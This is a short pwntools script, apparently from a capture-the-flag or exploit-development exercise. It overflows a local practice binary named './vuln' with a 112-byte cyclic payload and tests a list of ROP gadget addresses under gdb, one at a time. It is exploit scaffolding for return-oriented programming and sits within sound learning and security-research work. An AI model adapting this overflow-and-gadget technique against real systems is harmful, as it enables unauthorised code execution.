#!/usr/bin/env python3
from pwn import *

def test_gadget(binary_path, address):
    """Test if a gadget is valid and executable"""
    p = process(binary_path)
    gdb.attach(p, f'b *{address}')
    
    # Send minimal payload to reach gadget
    payload = cyclic(112)  # Basic overflow
    payload += p32(address)
    
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    binary = "./vuln"
    # Test each gadget individually
    gadgets = [
        0x0804919a,  # pop eax
        0x0804901e,  # pop ebx
        0x080491a4,  # pop ecx
        0xf7c38e2c,  # pop edx
        0x080491b4   # int 0x80
    ]
    
    for gadget in gadgets:
        print(f"Testing gadget at {hex(gadget)}")
        test_gadget(binary, gadget)
